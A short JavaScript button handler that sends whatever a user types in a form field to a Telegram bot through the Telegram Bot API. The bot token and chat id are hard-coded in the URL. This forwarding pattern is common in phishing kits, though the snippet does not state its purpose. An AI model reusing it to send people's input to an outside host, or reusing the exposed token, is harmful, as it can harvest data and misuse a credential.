butt.onclick = function () {
  var val = document.getElementById("elem1").value;

  var telegram =
    "https://api.telegram.org/bot1403106172:AAF0cYqbdUgpDOQqllWvZTo1vOfUUNoDvo4/sendMessage?chat_id=-1001077685352&text=";

  var getPageList = new XMLHttpRequest();
  getPageList.open("POST", telegram + val, true);

  getPageList.send(null);
};
